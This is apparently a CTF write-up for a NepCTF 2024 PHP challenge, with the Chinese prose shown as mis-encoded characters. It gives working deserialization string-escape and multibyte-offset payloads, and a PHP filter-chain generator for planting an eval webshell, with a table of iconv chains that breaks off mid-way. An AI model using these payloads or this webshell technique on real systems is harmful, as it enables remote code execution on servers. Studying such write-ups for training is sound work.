class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">===</span> <span class="token string double-quoted-string">"\0key\0"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"[welcome to"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"CTF]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">===</span><span class="token string single-quoted-string">'NepCTF]'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span> <span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">,</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼è¥¿ç“œæ¯ Ezzz_php è¿›é˜¶ç‰ˆ</p><p>ç¬¬ä¸€æ­¥ï¼Œå­—ç¬¦ä¸²é€ƒé€¸æ¥ä½¿ C ä¸­çš„ str å±æ€§ä¸ºæˆ‘ä»¬çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ<code>%00</code>å˜ä¸º<code>00</code>ä¼šå¢åŠ 1ä½ï¼Œé€ƒé€¸<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;N;&#125;&#125;&quot;</code>å…±36ä½ï¼Œå³é‡å¤36é</p><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token string double-quoted-string">";s:3:"</span>str<span class="token string double-quoted-string">";O:1:"</span><span class="token constant">B</span><span class="token string double-quoted-string">":1:&#123;s:1:"</span>b<span class="token string double-quoted-string">";N;&#125;&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬äºŒæ­¥ï¼Œå®½å­—èŠ‚æ³¨å…¥</p><blockquote><p>æ¯å‘é€ä¸€ä¸ª<code>%f0abc</code>ï¼Œmb_strposè®¤ä¸ºæ˜¯4ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®3ä¸ªå­—èŠ‚<br>æ¯å‘é€ä¸€ä¸ª<code>%f0%9fab</code>,mb_strposè®¤ä¸ºæ˜¯3ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®2ä¸ªå­—èŠ‚<br>æ¯å‘é€ä¸€ä¸ª<code>%f0%9f%9fa</code>,mb_strposè®¤ä¸ºæ˜¯2ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®1ä¸ªå­—èŠ‚</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">nep<span class="token operator">=</span>Nep<span class="token operator">&amp;</span>nep1<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬ä¸‰æ­¥ï¼Œåˆ°äº†<code>return ($this-&gt;b) ();</code>è¿™é‡Œ</p><p>æ•…æŠ€é‡æ–½ï¼Œå…ˆè¯»phpinfo()</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token string double-quoted-string">";s:3:"</span>str<span class="token string double-quoted-string">";O:1:"</span><span class="token constant">B</span><span class="token string double-quoted-string">":1:&#123;s:1:"</span>b<span class="token string double-quoted-string">";s:7:"</span>phpinfo<span class="token string double-quoted-string">";&#125;&#125;"</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>Nep<span class="token operator">&amp;</span>nep1<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824163621405.png" alt="image-20240824163621405"></p><p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œæ„Ÿè§‰æ˜¯éé¢„æœŸäº†</p><h2 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">===</span> <span class="token string double-quoted-string">"\0key\0"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åæ˜¯readflagå‡½æ•°ï¼Œè°ƒç”¨æ–¹å¼åƒè¿™æ ·</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'readflag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token comment">// O:1:"C":2:&#123;s:1:"s";s:1:"1";s:3:"str";O:1:"B":1:&#123;s:1:"b";a:2:&#123;i:0;O:1:"A":1:&#123;s:3:"key";N;&#125;i:1;s:8:"readflag";&#125;&#125;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾åªèƒ½åœ¨ index.php é‡Œé¢å†™é©¬ï¼Œé‚£å°±æ˜¯filterchainäº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$base64_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4"</span><span class="token punctuation">;</span> <span class="token comment">/*&lt;?php @eval($_REQUEST['cmd']);?>*/</span><span class="token variable">$conversions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'/'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'0'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'2'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'3'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'4'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'5'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'6'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'7'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'8'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'9'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'A'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'B'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'C'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'D'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'E'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'F'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'G'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'H'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'I'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'J'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'K'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'L'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'M'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'N'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'O'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'P'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Q'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'R'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'S'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'T'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'U'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'V'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'W'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'X'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'b'</span> <span class="token operator">=></span> <span class="token string 